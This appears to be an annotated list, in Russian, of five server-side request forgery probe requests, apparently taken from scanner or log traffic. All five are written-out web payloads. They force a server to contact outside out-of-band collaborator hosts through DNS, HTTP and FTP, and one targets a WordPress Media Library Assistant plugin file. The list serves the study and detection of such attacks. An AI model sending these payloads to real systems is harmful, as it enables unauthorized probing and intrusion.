# SSRF (Server-Side Request Forgery)

### Запрос 1
```http
/dns-query?dns=SrMBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
```
Действие: DNS-over-HTTPS запрос – взаимодействие с внешним DNS (проверка доступа).

### Запрос 2
```http
/resolve?name=1.odns.m.dnsmeasure.top&type=A
```
Действие: принудительный DNS-резолвинг внешнего домена.

### Запрос 3
```http
/models?url=http%3a//d8ju5uj5ls8pboulifi0bgnjaknfad8ye.oast.site
```
Действие: запрос к внешнему HTTP-адресу (коллаборатор).

### Запрос 4
```http
/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://d8ju5uj5ls8pboulifi0tpt6gtsa13w6s.oast.site/patrowl.svg
```
Действие: загрузка файла по протоколу FTP (SSRF через mla_stream_file).

### Запрос 5
```http
/bypass/config?type=sqs&keyId=test&key=security&queueUrl=http://d8ju5uj5ls8pboulifi0k1cbcrrg9khhw.oast.site/
```
Действие: SSRF через параметр queueUrl (AWS SQS-конфиг).
